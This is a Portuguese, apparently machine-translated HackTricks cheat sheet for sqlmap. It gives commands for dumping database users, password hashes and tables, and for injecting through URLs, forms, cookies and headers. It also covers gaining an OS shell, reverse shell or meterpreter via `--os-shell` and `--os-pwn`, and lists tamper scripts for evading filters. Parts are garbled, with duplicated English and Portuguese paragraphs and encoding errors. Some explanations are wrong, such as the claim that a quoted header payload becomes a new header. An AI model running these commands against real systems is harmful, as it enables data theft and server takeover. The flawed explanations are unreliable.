<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Argumentos b√°sicos para o SQLmap

## Gen√©rico
```bash
-u "<URL>" 
-p "<PARAM TO TEST>" 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=PROXY
```
## Recuperar Informa√ß√µes

### Interno
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
```
### Dados do banco de dados
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
# Local de Inje√ß√£o

## A partir da captura do Burp/ZAP

Capture a requisi√ß√£o e crie um arquivo req.txt
```bash
sqlmap -r req.txt --current-user
```
## Inje√ß√£o em Requisi√ß√µes GET

### Introdu√ß√£o

A inje√ß√£o em requisi√ß√µes GET √© uma t√©cnica de ataque que explora vulnerabilidades em par√¢metros de URL para executar comandos maliciosos no servidor. Essa t√©cnica √© semelhante √† inje√ß√£o SQL, mas em vez de explorar vulnerabilidades em consultas SQL, ela explora vulnerabilidades em par√¢metros de URL.

### Identificando Vulnerabilidades

Para identificar vulnerabilidades em par√¢metros de URL, voc√™ pode usar o Sqlmap. O Sqlmap √© uma ferramenta de teste de penetra√ß√£o que automatiza a detec√ß√£o e explora√ß√£o de vulnerabilidades de inje√ß√£o SQL. Ele tamb√©m pode ser usado para identificar vulnerabilidades em par√¢metros de URL.

### Executando um Ataque

Para executar um ataque de inje√ß√£o em requisi√ß√µes GET, voc√™ precisa identificar um par√¢metro de URL vulner√°vel. Voc√™ pode fazer isso usando o Sqlmap ou manualmente, examinando a URL em busca de par√¢metros que possam ser explorados.

Depois de identificar um par√¢metro vulner√°vel, voc√™ pode usar o Sqlmap para explor√°-lo. O Sqlmap tentar√° injetar comandos maliciosos no par√¢metro e, se bem-sucedido, executar√° esses comandos no servidor.

### Preven√ß√£o

Para prevenir ataques de inje√ß√£o em requisi√ß√µes GET, √© importante validar e sanitizar todos os dados de entrada. Isso inclui dados de entrada em par√¢metros de URL. Al√©m disso, √© importante limitar o acesso aos par√¢metros de URL para evitar que usu√°rios mal-intencionados explorem vulnerabilidades.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
## Inje√ß√£o de Requisi√ß√£o POST
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
## Inje√ß√µes em Headers e outros M√©todos HTTP

### Header Injection

### Inje√ß√£o em Headers

Header injection vulnerabilities occur when user input is not properly sanitized and is included in an HTTP header. This can allow an attacker to inject additional headers or modify existing ones, potentially leading to a range of attacks such as cross-site scripting (XSS), session hijacking, and cache poisoning.

Vulnerabilidades de inje√ß√£o em headers ocorrem quando a entrada do usu√°rio n√£o √© devidamente sanitizada e √© inclu√≠da em um header HTTP. Isso pode permitir que um atacante injete headers adicionais ou modifique os existentes, potencialmente levando a uma s√©rie de ataques, como cross-site scripting (XSS), sequestro de sess√£o e envenenamento de cache.

To test for header injection vulnerabilities, you can use the `--header` option in sqlmap to specify a custom header with a payload. For example:

Para testar vulnerabilidades de inje√ß√£o em headers, voc√™ pode usar a op√ß√£o `--header` no sqlmap para especificar um header personalizado com uma carga √∫til. Por exemplo:

```
sqlmap -r request.txt --header="X-Forwarded-For: 127.0.0.1' or '1'='1"
```

This will send a request with the `X-Forwarded-For` header set to `127.0.0.1' or '1'='1`, which will be interpreted by the server as `127.0.0.1`, followed by a new header `or '1'='1'`.

Isso enviar√° uma solicita√ß√£o com o header `X-Forwarded-For` definido como `127.0.0.1' or '1'='1`, que ser√° interpretado pelo servidor como `127.0.0.1`, seguido de um novo header `or '1'='1'`.

### Other HTTP Methods

### Outros M√©todos HTTP

In addition to GET and POST requests, there are several other HTTP methods that can be used to interact with a web application, including PUT, DELETE, and OPTIONS. These methods are often used in RESTful APIs and can be vulnerable to injection attacks.

Al√©m das solicita√ß√µes GET e POST, existem v√°rios outros m√©todos HTTP que podem ser usados para interagir com um aplicativo da web, incluindo PUT, DELETE e OPTIONS. Esses m√©todos s√£o frequentemente usados em APIs RESTful e podem ser vulner√°veis a ataques de inje√ß√£o.

To test for injection vulnerabilities in these methods, you can use the `--method` option in sqlmap to specify the HTTP method to use. For example:

Para testar vulnerabilidades de inje√ß√£o nesses m√©todos, voc√™ pode usar a op√ß√£o `--method` no sqlmap para especificar o m√©todo HTTP a ser usado. Por exemplo:

```
sqlmap -r request.txt --method=PUT --data="id=1&name=admin'"
```

This will send a PUT request with the data `id=1&name=admin'` in the body, which will be interpreted by the server as `id=1&name=admin`, followed by a single quote.

Isso enviar√° uma solicita√ß√£o PUT com os dados `id=1&name=admin'` no corpo, que ser√° interpretado pelo servidor como `id=1&name=admin`, seguido de uma √∫nica aspa.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
## Inje√ß√£o de segunda ordem
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
## Shell

## Shell
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
## Rastreando um site com SQLmap e auto-exploit

O SQLmap √© uma ferramenta poderosa para testes de penetra√ß√£o em sites que possuem vulnerabilidades de inje√ß√£o de SQL. Uma das funcionalidades mais √∫teis do SQLmap √© a capacidade de rastrear automaticamente um site em busca de vulnerabilidades de inje√ß√£o de SQL e, em seguida, explor√°-las automaticamente.

Para rastrear um site com SQLmap, basta executar o seguinte comando:

```
sqlmap -u <URL> --crawl=1
```

Isso far√° com que o SQLmap rastreie o site especificado na URL e procure por vulnerabilidades de inje√ß√£o de SQL. O par√¢metro `--crawl=1` indica que o SQLmap deve seguir todos os links encontrados no site e rastre√°-los tamb√©m.

Se o SQLmap encontrar uma vulnerabilidade de inje√ß√£o de SQL, ele tentar√° explor√°-la automaticamente. Isso pode incluir a extra√ß√£o de dados do banco de dados, a execu√ß√£o de comandos no sistema operacional do servidor e muito mais.

√â importante lembrar que o uso do SQLmap em um site sem autoriza√ß√£o pr√©via √© ilegal e pode resultar em consequ√™ncias graves. Sempre obtenha permiss√£o antes de realizar testes de penetra√ß√£o em um site.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
# Personalizando a Inje√ß√£o

## Definindo um sufixo
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
## Prefixo
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
## Ajuda para encontrar inje√ß√£o booleana
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
## Manipula√ß√£o
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper | Descri√ß√£o |
| :--- | :--- |
| apostrophemask.py | Substitui o caractere de ap√≥strofo pelo seu equivalente UTF-8 de largura total |
| apostrophenullencode.py | Substitui o caractere de ap√≥strofo pelo seu equivalente duplo unicode ilegal |
| appendnullbyte.py | Adiciona um byte nulo codificado ao final da carga √∫til |
| base64encode.py | Codifica em base64 todos os caracteres em uma determinada carga √∫til |
| between.py | Substitui o operador maior que \('&gt;'\) por 'NOT BETWEEN 0 AND \#' |
| bluecoat.py | Substitui o caractere de espa√ßo ap√≥s a instru√ß√£o SQL por um caractere em branco v√°lido aleat√≥rio. Em seguida, substitui o caractere '=' pelo operador LIKE |
| chardoubleencode.py | Codifica em URL dupla todos os caracteres em uma determinada carga √∫til \(n√£o processando os j√° codificados\) |
| commalesslimit.py | Substitui inst√¢ncias como 'LIMIT M, N' por 'LIMIT N OFFSET M' |
| commalessmid.py | Substitui inst√¢ncias como 'MID\(A, B, C\)' por 'MID\(A FROM B FOR C\)' |
| concat2concatws.py | Substitui inst√¢ncias como 'CONCAT\(A, B\)' por 'CONCAT\_WS\(MID\(CHAR\(0\), 0, 0\), A, B\)' |
| charencode.py | Codifica em URL todos os caracteres em uma determinada carga √∫til \(n√£o processando os j√° codificados\) |
| charunicodeencode.py | Codifica em URL Unicode caracteres n√£o codificados em uma determinada carga √∫til \(n√£o processando os j√° codificados\). "%u0022" |
| charunicodeescape.py | Codifica em URL Unicode caracteres n√£o codificados em uma determinada carga √∫til \(n√£o processando os j√° codificados\). "\u0022" |
| equaltolike.py | Substitui todas as ocorr√™ncias do operador igual \('='\) pelo operador 'LIKE' |
| escapequotes.py | Escapa aspas \(' and "\) |
| greatest.py | Substitui o operador maior que \('&gt;'\) pelo seu equivalente GREATEST |
| halfversionedmorekeywords.py | Adiciona coment√°rio versionado do MySQL antes de cada palavra-chave |
| ifnull2ifisnull.py | Substitui inst√¢ncias como 'IFNULL\(A, B\)' por 'IF\(ISNULL\(A\), B, A\)' |
| modsecurityversioned.py | Abra√ßa a consulta completa com coment√°rio versionado |
| modsecurityzeroversioned.py | Abra√ßa a consulta completa com coment√°rio de vers√£o zero |
| multiplespaces.py | Adiciona v√°rios espa√ßos em torno de palavras-chave SQL |
| nonrecursivereplacement.py | Substitui palavras-chave SQL predefinidas por representa√ß√µes adequadas para substitui√ß√£o \(por exemplo, .replace\("SELECT", ""\)\) filtros |
| percentage.py | Adiciona um sinal de porcentagem \('%'\) na frente de cada caractere |
| overlongutf8.py | Converte todos os caracteres em uma determinada carga √∫til \(n√£o processando os j√° codificados\) |
| randomcase.py | Substitui cada caractere de palavra-chave por um valor de caso aleat√≥rio |
| randomcomments.py | Adiciona coment√°rios aleat√≥rios √†s palavras-chave SQL |
| securesphere.py | Acrescenta uma string especial criada |
| sp\_password.py | Acrescenta 'sp\_password' ao final da carga √∫til para obfusca√ß√£o autom√°tica dos logs do DBMS |
| space2comment.py | Substitui o caractere de espa√ßo \(' '\) por coment√°rios |
| space2dash.py | Substitui o caractere de espa√ßo \(' '\) por um coment√°rio de tra√ßo \('--'\) seguido de uma string aleat√≥ria e uma nova linha \('\n'\) |
| space2hash.py | Substitui o caractere de espa√ßo \(' '\) por um caractere de libra \('\#'\) seguido de uma string aleat√≥ria e uma nova linha \('\n'\) |
| space2morehash.py | Substitui o caractere de espa√ßo \(' '\) por um caractere de libra \('\#'\) seguido de uma string aleat√≥ria e uma nova linha \('\n'\) |
| space2mssqlblank.py | Substitui o caractere de espa√ßo \(' '\) por um caractere em branco aleat√≥rio de um conjunto v√°lido de caracteres alternativos |
| space2mssqlhash.py | Substitui o caractere de espa√ßo \(' '\) por um caractere de libra \('\#'\) seguido de uma nova linha \('\n'\) |
| space2mysqlblank.py | Substitui o caractere de espa√ßo \(' '\) por um caractere em branco aleat√≥rio de um conjunto v√°lido de caracteres alternativos |
| space2mysqldash.py | Substitui o caractere de espa√ßo \(' '\) por um coment√°rio de tra√ßo \('--'\) seguido de uma nova linha \('\n'\) |
| space2plus.py | Substitui o caractere de espa√ßo \(' '\) por um sinal de mais \('+'\). |
| space2randomblank.py | Substitui o caractere de espa√ßo \(' '\) por um caractere em branco aleat√≥rio de um conjunto v√°lido de caracteres alternativos |
| symboliclogical.py | Substitui os operadores l√≥gicos AND e OR por seus equivalentes simb√≥licos \(&& e |
| unionalltounion.py | Substitui UNION ALL SELECT por UNION SELECT |
| unmagicquotes.py | Substitui o caractere de aspas \('\) por uma combina√ß√£o multibyte %bf%27 juntamente com um coment√°rio gen√©rico no final \(para faz√™-lo funcionar\) |
| uppercase.py | Substitui cada caractere de palavra-chave por um valor em mai√∫scula 'INSERT' |
| varnish.py | Acrescenta um cabe√ßalho HTTP 'X-originating-IP' |
| versionedkeywords.py | Encerra cada palavra-chave n√£o funcional com coment√°rio versionado do MySQL |
| versionedmorekeywords.py | Encerra cada palavra-chave com coment√°rio versionado do MySQL |
| xforwardedfor.py | Acrescenta um cabe√ßalho HTTP falso 'X-Forwarded-For' |
